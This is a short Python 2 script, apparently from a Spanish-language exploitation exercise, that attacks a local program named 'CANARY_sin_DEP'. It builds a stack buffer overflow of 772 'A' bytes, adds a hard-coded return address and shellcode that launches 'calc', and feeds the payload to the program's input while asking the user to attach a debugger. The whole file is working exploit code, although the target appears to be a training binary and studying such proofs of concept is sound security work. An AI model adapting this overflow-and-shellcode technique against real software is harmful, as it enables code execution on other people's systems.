from os import *
import struct


shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"

stdin,stdout = popen4(r'CANARY_sin_DEP -1')
print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()
fruta="A" * 772 + struct.pack("<L",0x7800F7C1) + shellcode + "\n"

print stdin

print "Escribe: " + fruta
stdin.write(fruta)
print stdout.read(40)




